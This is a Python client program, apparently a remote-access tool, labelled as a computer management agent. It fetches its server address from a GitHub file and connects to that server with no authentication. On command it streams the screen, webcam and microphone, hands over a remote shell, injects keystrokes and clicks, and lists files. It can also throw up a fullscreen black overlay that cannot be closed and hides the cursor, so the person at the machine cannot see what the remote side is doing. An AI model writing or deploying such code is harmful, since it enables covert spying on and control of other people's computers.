#!/usr/bin/env python3
"""
Computer Management Client Agent
"""

import asyncio
import websockets
import json
import platform
import psutil
import base64
import cv2
import pyautogui
import sounddevice as sd
import numpy as np
import subprocess
import sys
import urllib.request

import logging
import uuid
import os
import io
import threading
from PIL import ImageGrab
from PIL import Image

pyautogui.FAILSAFE = False

# Optional tkinter import for black screen feature
try:
    import tkinter as tk
    HAS_TKINTER = True
except ImportError:
    HAS_TKINTER = False
    logger = logging.getLogger(__name__)
    logger.warning("tkinter not available - black screen feature disabled")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class BlackScreenOverlay:
    def __init__(self):
        self.roots = []
        self.available = HAS_TKINTER

    def enable(self):
        if not self.available:
            logger.warning("Black screen feature not available (tkinter missing)")
            return
        if self.roots:
            return  # Already active
        
        # Create a borderless, top-level black window on all displays
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(background='black')
        root.config(cursor="none")  # Hide mouse cursor
        
        # Prevent user from closing window easily via standard hotkeys
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        root.bind("<Alt-F4>", lambda e: "break")
        root.bind("<Control-w>", lambda e: "break")
        
        self.roots.append(root)
        
        # Run tkinter event loop non-blocking in a background thread/task
        def run_loop():
            root.mainloop()
            
        threading.Thread(target=run_loop, daemon=True).start()

    def disable(self):
        for root in self.roots:
            try:
                root.destroy()
            except Exception:
                pass
        self.roots = []


# Instantiate overlay manager globally in client.py
black_overlay = BlackScreenOverlay()


class ComputerClientAgent:
    def __init__(self, server_host='localhost', server_port=8765):
        self.server_host = server_host
        self.server_port = server_port
        self.client_id = str(uuid.uuid4())
        self.websocket = None
        self.screen_sharing = False
        self.webcam_sharing = False
        self.audio_streaming = False
        self.terminal_process = None

    def get_system_info(self):
        try:
            return {
                'hostname': platform.node(),
                'os': platform.system(),
                'os_version': platform.version(),
                'cpu_count': psutil.cpu_count()
            }
        except Exception as e:
            logger.error(f"Error getting system info: {e}")
            return {}

    def list_directory(self, path='.'):
        try:
            target_path = os.path.abspath(os.path.expanduser(path))
            files = []
            for item in os.listdir(target_path):
                item_path = os.path.join(target_path, item)
                try:
                    stat = os.stat(item_path)
                    files.append({
                        'name': item,
                        'path': item_path,
                        'is_dir': os.path.isdir(item_path),
                        'size': stat.st_size if not os.path.isdir(item_path) else 0,
                        'modified': stat.st_mtime
                    })
                except Exception:
                    files.append({
                        'name': item,
                        'path': item_path,
                        'is_dir': False,
                        'size': 0,
                        'modified': 0
                    })
            return files, target_path
        except Exception as e:
            logger.error(f"Error listing directory: {e}")
            return [], path

    async def capture_screen(self, sct):
        try:
            # Capture primary monitor using mss (ultra-fast C bindings)
            monitor = sct.monitors[1]
            sct_img = sct.grab(monitor)
            
            # Convert directly to PIL Image
            image = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")

            # 1920px width keeps text crystal clear while remaining fast over local network
            target_width = 1920
            if image.width > target_width:
                height = int(image.height * (target_width / image.width))
                image = image.resize((target_width, height), Image.Resampling.LANCZOS)

            buffer = io.BytesIO()
            # JPEG quality 80 provides high detail and crisp text
            image.save(buffer, format="JPEG", quality=80, optimize=True)
            encoded = base64.b64encode(buffer.getvalue()).decode('utf-8')

            await self.websocket.send(json.dumps({
                'type': 'screen_capture',
                'image': encoded
            }))
        except Exception as e:
            logger.error(f"Error capturing screen: {e}")

    async def start_screen_sharing(self):
        import mss
        self.screen_sharing = True
        logger.info("Starting high-framerate (60 FPS target) screen stream")
        
        target_frame_time = 1.0 / 60.0  # ~0.016s per frame
        with mss.mss() as sct:
            while self.screen_sharing:
                start_time = asyncio.get_event_loop().time()
                
                await self.capture_screen(sct)
                
                # Dynamic sleep calculation to hit true 60 FPS
                elapsed = asyncio.get_event_loop().time() - start_time
                sleep_time = max(0.001, target_frame_time - elapsed)
                await asyncio.sleep(sleep_time)
    def stop_screen_sharing(self):
        self.screen_sharing = False

    async def start_webcam_sharing(self):
        self.webcam_sharing = True
        logger.info("Starting webcam stream")
        
        # 0 opens default system webcam
        cap = cv2.VideoCapture(0)
        
        # Lower resolution slightly for ultra-fast response
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

        target_frame_time = 1.0 / 30.0  # 30 FPS webcam
        try:
            while self.webcam_sharing:
                start_time = asyncio.get_event_loop().time()
                ret, frame = cap.read()
                if ret:
                    # Compress OpenCV BGR frame directly to JPEG
                    _, jpeg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
                    encoded = base64.b64encode(jpeg.tobytes()).decode('utf-8')

                    await self.websocket.send(json.dumps({
                        'type': 'webcam_capture',
                        'image': encoded
                    }))

                elapsed = asyncio.get_event_loop().time() - start_time
                await asyncio.sleep(max(0.001, target_frame_time - elapsed))
        finally:
            cap.release()

    def stop_webcam_sharing(self):
        self.webcam_sharing = False

    async def handle_input_event(self, data):
        try:
            event_type = data.get('event')
            
            if event_type == 'mouse_click':
                # Convert percentage coordinates back to client display pixels
                screen_width, screen_height = pyautogui.size()
                x = int(data['x_pct'] * screen_width)
                y = int(data['y_pct'] * screen_height)
                button = data.get('button', 'left') # 'left', 'right', 'middle'
                
                pyautogui.click(x=x, y=y, button=button)

            elif event_type == 'mouse_move':
                screen_width, screen_height = pyautogui.size()
                x = int(data['x_pct'] * screen_width)
                y = int(data['y_pct'] * screen_height)
                pyautogui.moveTo(x, y)

            elif event_type == 'scroll':
                clicks = data.get('delta', 0)
                pyautogui.scroll(clicks)

            elif event_type == 'key_press':
                key = data.get('key')
                if key:
                    pyautogui.press(key)

            elif event_type == 'type_text':
                text = data.get('text')
                if text:
                    pyautogui.typewrite(text)
        except Exception as e:
            logger.error(f"Error handling input event: {e}")

    async def start_audio_sharing(self):
        self.audio_streaming = True
        logger.info("Starting audio recording stream")
        
        sample_rate = 16000
        channels = 1
        block_size = 1024 # ~64ms chunks

        def callback(indata, frames, time_info, status):
            if not self.audio_streaming:
                raise sd.CallbackStop()
            # Convert float32 array -> int16 binary -> Base64
            audio_int16 = (indata * 32767).astype(np.int16)
            encoded = base64.b64encode(audio_int16.tobytes()).decode('utf-8')
            
            asyncio.run_coroutine_threadsafe(
                self.websocket.send(json.dumps({
                    'type': 'audio_chunk',
                    'data': encoded
                })),
                asyncio.get_event_loop()
            )

        with sd.InputStream(samplerate=sample_rate, channels=channels, dtype='float32', blocksize=block_size, callback=callback):
            while self.audio_streaming:
                await asyncio.sleep(0.1)

    def stop_audio_sharing(self):
        self.audio_streaming = False

    async def run_maintenance_preset(self, preset_key):
        # Define approved, explicit diagnostic commands
        commands = {
            'check_ip': 'ipconfig /all' if platform.system() == 'Windows' else 'ifconfig -a',
            'flush_dns': 'ipconfig /flushdns' if platform.system() == 'Windows' else 'sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder',
            'list_ports': 'netstat -ano' if platform.system() == 'Windows' else 'netstat -tuln',
            'system_info': 'systeminfo' if platform.system() == 'Windows' else 'uname -a'
        }

        cmd = commands.get(preset_key)
        if not cmd:
            logger.warning(f"Unknown preset requested: {preset_key}")
            return

        try:
            # Execute command safely in a subprocess
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            output = result.stdout if result.returncode == 0 else result.stderr
            
            await self.websocket.send(json.dumps({
                'type': 'preset_output',
                'preset': preset_key,
                'output': output
            }))
        except Exception as e:
            logger.error(f"Error running preset {preset_key}: {e}")

    async def start_terminal(self):
        if self.terminal_process is None:
            try:
                shell = os.environ.get('SHELL', '/bin/bash' if os.name != 'nt' else 'cmd.exe')
                self.terminal_process = await asyncio.create_subprocess_shell(
                    shell,
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT
                )
                asyncio.create_task(self.read_terminal_output())
                logger.info("Terminal session established")
            except Exception as e:
                logger.error(f"Error starting terminal: {e}")

    async def read_terminal_output(self):
        if self.terminal_process:
            while True:
                try:
                    output = await self.terminal_process.stdout.read(1024)
                    if not output:
                        break
                    await self.websocket.send(json.dumps({
                        'type': 'terminal_output',
                        'output': output.decode('utf-8', errors='replace')
                    }))
                except Exception as e:
                    logger.error(f"Error reading terminal output: {e}")
                    break

    async def send_terminal_input(self, input_text):
        if self.terminal_process and self.terminal_process.stdin:
            try:
                self.terminal_process.stdin.write(input_text.encode())
                await self.terminal_process.stdin.drain()
            except Exception as e:
                logger.error(f"Error sending terminal input: {e}")

    async def handle_server_message(self, message):
        try:
            data = json.loads(message)
            msg_type = data.get('type')

            if msg_type == 'start_terminal':
                await self.start_terminal()
            elif msg_type == 'terminal_input':
                await self.send_terminal_input(data.get('input', ''))
            elif msg_type == 'start_screen_share':
                if not self.screen_sharing:
                    asyncio.create_task(self.start_screen_sharing())
            elif msg_type == 'stop_screen_share':
                self.stop_screen_sharing()
            elif msg_type == 'start_webcam_share':
                if not self.webcam_sharing:
                    asyncio.create_task(self.start_webcam_sharing())
            elif msg_type == 'stop_webcam_share':
                self.stop_webcam_sharing()
            elif msg_type == 'enable_black_screen':
                black_overlay.enable()
            elif msg_type == 'disable_black_screen':
                black_overlay.disable()
            elif msg_type == 'input_event':
                await self.handle_input_event(data)
            elif msg_type == 'start_audio':
                asyncio.create_task(self.start_audio_sharing())
            elif msg_type == 'stop_audio':
                self.stop_audio_sharing()
            elif msg_type == 'run_preset':
                await self.run_maintenance_preset(data.get('preset'))
            elif msg_type == 'list_directory':
                path = data.get('path', '.')
                files, resolved_path = self.list_directory(path)
                await self.websocket.send(json.dumps({
                    'type': 'directory_list',
                    'path': resolved_path,
                    'files': files
                }))

        except Exception as e:
            logger.error(f"Error handling server message: {e}")

    async def connect_to_server(self):
        uri = f"ws://{self.server_host}:{self.server_port}"
        logger.info(f"Connecting to {uri}")

        while True:
            try:
                async with websockets.connect(uri) as websocket:
                    self.websocket = websocket
                    # Initial registration message
                    await websocket.send(json.dumps({
                        'client_id': self.client_id,
                        'info': self.get_system_info()
                    }))

                    async for message in websocket:
                        await self.handle_server_message(message)

            except Exception as e:
                logger.error(f"Connection error: {e}. Retrying in 3s...")
                self.stop_screen_sharing()
                await asyncio.sleep(3)


def get_server_ip_from_github():
    """Fetch server IP from GitHub clientip.txt file"""
    try:
        url = "https://raw.githubusercontent.com/FuzzyGumnut/Computer-Manager-System/main/clientip.txt"
        response = urllib.request.urlopen(url, timeout=5)
        ip = response.read().decode('utf-8').strip()
        if ip:
            print(f"Fetched server IP from GitHub: {ip}")
            return ip
    except Exception as e:
        print(f"Failed to fetch IP from GitHub: {e}")
    return None

def main():
    # Change to the script's directory
    import os
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    # Get server host and port from command line args or use defaults
    server_host = sys.argv[1] if len(sys.argv) > 1 else None
    server_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8765
    
    # If no host provided, try to fetch from GitHub
    if not server_host:
        server_host = get_server_ip_from_github()
        if not server_host:
            # Fallback to localhost if GitHub fetch fails
            server_host = 'localhost'
            print("Using localhost as fallback")

    print(f"Starting Computer Manager Client Agent...")
    print(f"Connecting to: {server_host}:{server_port}")

    client = ComputerClientAgent(server_host, server_port)
    asyncio.run(client.connect_to_server())


if __name__ == '__main__':
    main()